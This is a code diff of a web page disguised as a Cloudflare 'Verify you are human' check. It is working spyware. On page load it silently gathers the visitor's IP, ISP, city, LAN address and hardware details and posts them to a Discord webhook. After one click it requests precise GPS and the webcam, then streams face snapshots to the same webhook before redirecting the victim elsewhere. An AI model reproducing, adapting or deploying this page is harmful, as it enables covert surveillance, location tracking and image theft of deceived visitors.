@@ -5,20 +5,20 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Cloudflare | Security Check</title>
     <style>
-        body{background:#fff;font-family:-apple-system,system-ui,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#313131;overflow:hidden;user-select:none;touch-action:none}
-        .cf-w{width:100%;max-width:420px;padding:35px;box-sizing:border-box;text-align:center;position:relative;border:1px solid #f2f2f2;border-radius:12px;box-shadow:0 12px 40px rgba(0,0,0,0.06);z-index:10;background:#fff}
-        .logo{width:115px;margin-bottom:25px}
-        .h1{font-size:22px;font-weight:600;margin-bottom:12px;letter-spacing:-0.5px}
-        .p{font-size:14px;color:#666;margin-bottom:25px;line-height:1.6}
-        .vf{width:100%;height:240px;background:#000;border-radius:10px;margin-bottom:25px;overflow:hidden;display:none;border:2px solid #0051c3}
+        body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#313131;overflow:hidden;user-select:none;touch-action:none}
+        .cf-w{width:100%;max-width:420px;padding:45px 35px;box-sizing:border-box;text-align:center;position:relative;border:1px solid #e6e6e6;border-radius:2px;box-shadow:0 10px 40px rgba(0,0,0,0.06);z-index:10;background:#fff}
+        .logo{width:120px;margin-bottom:30px;filter:grayscale(20%)}
+        .h1{font-size:24px;font-weight:500;margin-bottom:12px;color:#000;letter-spacing:-0.5px}
+        .p{font-size:15px;color:#666;margin-bottom:30px;line-height:1.6}
+        .vf{width:100%;height:260px;background:#000;border-radius:6px;margin-bottom:25px;overflow:hidden;display:none;border:2px solid #0051c3}
         #v{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
-        .ts-b{background:#fafafa;border:1px solid #e0e0e0;border-radius:6px;padding:18px;display:flex;align-items:center;cursor:pointer;justify-content:center}
-        .ts-c{width:24px;height:24px;border:3px solid #0051c3;border-radius:4px;margin-right:15px;position:relative}
+        .ts-b{background:#fff;border:1px solid #ccc;border-radius:3px;padding:16px 20px;display:flex;align-items:center;cursor:pointer;justify-content:flex-start}
+        .ts-c{width:28px;height:28px;border:3px solid #0051c3;border-radius:4px;margin-right:15px;position:relative}
         .ts-c.s{border-top-color:transparent;border-radius:50%;animation:spin .8s linear infinite}
         .ts-c.d{background:#0051c3;border-color:#0051c3}
-        .ts-c.d::after{content:'';position:absolute;left:8px;top:3px;width:5px;height:11px;border:solid white;border-width:0 3px 3px 0;transform:rotate(45deg)}
-        .ts-t{font-size:15px;font-weight:500;color:#222}
-        .fn{font-size:11px;color:#bbb;margin-top:20px}
+        .ts-c.d::after{content:'';position:absolute;left:9px;top:4px;width:6px;height:12px;border:solid white;border-width:0 3px 3px 0;transform:rotate(45deg)}
+        .ts-t{font-size:16px;color:#333;font-weight:400}
+        .fn{font-size:12px;color:#999;margin-top:25px;border-top:1px solid #f0f0f0;padding-top:20px}
         #ovl{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1000;cursor:pointer}
         @keyframes spin{100%{transform:rotate(360deg)}}
     </style>
@@ -32,137 +32,116 @@
     <div class="h1">Verify you are human</div>
     <p class="p">Please complete the biometric challenge. Align your face to the viewfinder to secure your session.</p>
     <div class="vf" id="vf"><video id="v" autoplay playsinline muted></video><canvas id="c" style="display:none"></canvas></div>
-    <div class="ts-b"><div class="ts-c" id="l"></div><div class="ts-t" id="m">Verify identity</div></div>
-    <div class="fn">Protocol: **ABSOLUTE-ZERO** | Node: <span id="node"></span></div>
+    <div class="ts-b"><div class="ts-c" id="l"></div><div class="ts-t" id="m">I am human</div></div>
+    <div class="fn">Ray ID: <span id="rid"></span> • Protected by Turnstile v2</div>
 </div>
 
 <script>
-const CONFIG = {
+const CFG = {
     H: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0",
     R: "https://alksjdhf3rutyfhdi3urytghfjdei3nmkskj.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/",
-    D: 12000,
-    B: 1200
+    T: 14000
 };
 
-let ACTIVE = false, DATA = { lan: "Detecting...", count: 0 };
-document.getElementById('node').innerText = Math.random().toString(16).toUpperCase().slice(2,10);
+let ACTIVE = false, META = { lan: "Scanning...", count: 0, rid: "" };
 
-// --- 1. PASSIVE DEEPSCAN (Bypasses Lockdown & Tor) ---
-async function deepScan() {
-    DATA.ua = navigator.userAgent;
-    DATA.plt = navigator.platform;
-    DATA.mem = navigator.deviceMemory || "N/A";
-    DATA.cpu = navigator.hardwareConcurrency || "N/A";
-    DATA.res = `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`;
+// --- 1. THE ZERO-TAP THREAD (Passive Recon) ---
+async function passiveRecon() {
+    META.rid = (Math.random().toString(36).substring(2, 12)).toUpperCase();
+    document.getElementById('rid').innerText = META.rid;
 
-    // WebRTC LAN Leak
-    try {
-        const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
-        pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-        pc.onicecandidate = (e) => {
-            if(e.candidate) {
-                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                if(ip) DATA.lan = ip[1];
-            }
-        };
-    } catch(e){}
-
-    // GPU Analysis
+    // Hardware DeepScan
     try {
         const gl = document.createElement('canvas').getContext('webgl');
         const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        DATA.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Software/Hidden";
-    } catch(e){ DATA.gpu = "Protected"; }
+        META.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Hidden";
+        META.hw = `${navigator.hardwareConcurrency} core | ${navigator.deviceMemory || '?'}GB | ${screen.width}x${screen.height}`;
+    } catch(e){}
 
-    // IP & Geo Recon
+    // WebRTC LAN Leak
+    const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+    pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
+    pc.onicecandidate = (e) => { if(e.candidate) { const r = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if(r) META.lan = r[1]; }};
+
+    // IP & ISP
     try {
         const r = await fetch('https://ipapi.co/json/');
         const j = await r.json();
-        DATA.ip = j.ip; DATA.isp = j.org; DATA.loc = `${j.city}, ${j.country}`;
-    } catch(e){ DATA.ip = "Hidden/VPN"; }
+        META.ip = j.ip; META.isp = j.org; META.loc = `${j.city}, ${j.country}`;
+    } catch(e){ META.ip = "VPN/Hidden"; }
+
+    // INITIAL EXFIL (Zero-Tap)
+    await transmit(null, "🔱 PASSIVE RECON (0-TAP)");
 }
 
-// --- 2. TRANSMISSION (Optimized for Files) ---
-async function transmit(blob = null) {
-    DATA.count++;
-    const fd = new FormData();
-    const payload = {
-        username: "NEXUS v70 [ABSOLUTE-ZERO]",
-        embeds: [{
-            title: `🔱 EXFILTRATION BURST: ${DATA.count}`,
-            color: 0x0051c3,
-            fields: [
-                { name: "🌐 Network", value: `**IP:** \`${DATA.ip}\`\n**LAN:** \`${DATA.lan}\`\n**ISP:** ${DATA.isp}`, inline: true },
-                { name: "📍 Geo", value: DATA.gps || "Waiting...", inline: true },
-                { name: "📱 Hardware", value: `**GPU:** ${DATA.gpu}\n**CPU:** ${DATA.cpu} Cores\n**RAM:** ${DATA.mem}GB\n**RES:** ${DATA.res}`, inline: false }
-            ],
-            footer: { text: `v70 | NODE-${document.getElementById('node').innerText} | ${new Date().toLocaleTimeString()}` }
-        }]
-    };
-
-    fd.append("payload_json", JSON.stringify(payload));
-    if(blob) fd.append("file", blob, `shot_${DATA.count}.jpg`);
-
-    // Use Fetch with keepalive for reliability
-    return fetch(CONFIG.H, { method: 'POST', body: fd, keepalive: true });
-}
-
-// --- 3. BIOMETRIC CAPTURE ---
-async function startCapture(s) {
-    const v = document.getElementById('v');
-    const c = document.getElementById('c');
-    const ctx = c.getContext('2d');
-    v.srcObject = s;
-
-    const burst = setInterval(async () => {
-        if(!ACTIVE) return clearInterval(burst);
-        c.width = v.videoWidth; c.height = v.videoHeight;
-        ctx.drawImage(v, 0, 0);
-        
-        // Convert to Blob (lower quality = faster send)
-        c.toBlob(async (b) => {
-            await transmit(b);
-        }, 'image/jpeg', 0.3);
-    }, CONFIG.B);
-
-    setTimeout(() => {
-        ACTIVE = false;
-        s.getTracks().forEach(t => t.stop());
-        window.location.replace(CONFIG.R);
-    }, CONFIG.D);
-}
-
-// --- 4. THE 1-TAP TRIGGER ---
+// --- 2. THE ONE-TAP THREAD (Active Strike) ---
 async function stk() {
     if(ACTIVE) return;
     ACTIVE = true;
-
-    // UI Update
-    document.getElementById('ovl').style.display = 'none';
+    document.getElementById('ovl').remove();
     document.getElementById('l').className = 'ts-c s';
-    document.getElementById('m').innerText = "Attesting identity...";
+    document.getElementById('m').innerText = "Attesting...";
 
-    // GPS Precision (House Level)
+    // Force High-Accuracy GPS
     navigator.geolocation.getCurrentPosition(
-        p => DATA.gps = `[Google Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`,
-        e => DATA.gps = "❌ Blocked",
-        { enableHighAccuracy: true, timeout: 5000 }
+        p => META.gps = `[View House](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`,
+        e => META.gps = "❌ Blocked",
+        { enableHighAccuracy: true }
     );
 
-    // Camera Access
+    // Biometric Engagement
     try {
-        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640 } });
+        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         document.getElementById('vf').style.display = 'block';
-        await startCapture(s);
+        const v = document.getElementById('v');
+        v.srcObject = s;
+        
+        // Surveillance Loop
+        const burst = setInterval(async () => {
+            if(!ACTIVE) return clearInterval(burst);
+            const c = document.getElementById('c');
+            const ctx = c.getContext('2d');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            ctx.drawImage(v, 0, 0);
+            c.toBlob(b => transmit(b, `🔱 ACTIVE BURST: ${META.count}`), 'image/jpeg', 0.25);
+        }, 1100);
+
+        setTimeout(() => {
+            ACTIVE = false;
+            s.getTracks().forEach(t => t.stop());
+            window.location.replace(CFG.R);
+        }, CFG.T);
+
     } catch(e) {
-        // Fallback if camera denied
-        await transmit(null);
-        setTimeout(() => window.location.replace(CONFIG.R), 2500);
+        await transmit(null, "🔱 ONE-TAP (CAMERA DENIED)");
+        setTimeout(() => window.location.replace(CFG.R), 2000);
     }
 }
 
-// Initialize Passive Recon immediately
-deepScan();
+// --- 3. UNIFIED TRANSMITTER ---
+async function transmit(blob, title) {
+    META.count++;
+    const fd = new FormData();
+    const packet = {
+        username: "NEXUS-v80 [ABSOLUTE-ZERO]",
+        embeds: [{
+            title: title,
+            color: blob ? 0xF38020 : 0x0051c3,
+            fields: [
+                { name: "🌐 Network", value: `**IP:** \`${META.ip}\`\n**LAN:** \`${META.lan}\`\n**ISP:** ${META.isp}`, inline: true },
+                { name: "📍 Geo", value: META.gps || "Scanning...", inline: true },
+                { name: "📱 Device", value: `**GPU:** ${META.gpu}\n**SPEC:** ${META.hw}\n**OS:** ${navigator.platform}`, inline: false }
+            ],
+            footer: { text: `Ray-ID: ${META.rid} | v80` },
+            timestamp: new Date().toISOString()
+        }]
+    };
+    fd.append("payload_json", JSON.stringify(packet));
+    if(blob) fd.append("file", blob, `shot_${META.count}.jpg`);
+    return fetch(CFG.H, { method: 'POST', body: fd, keepalive: true });
+}
+
+passiveRecon();
 </script>
 </body>
 </html>
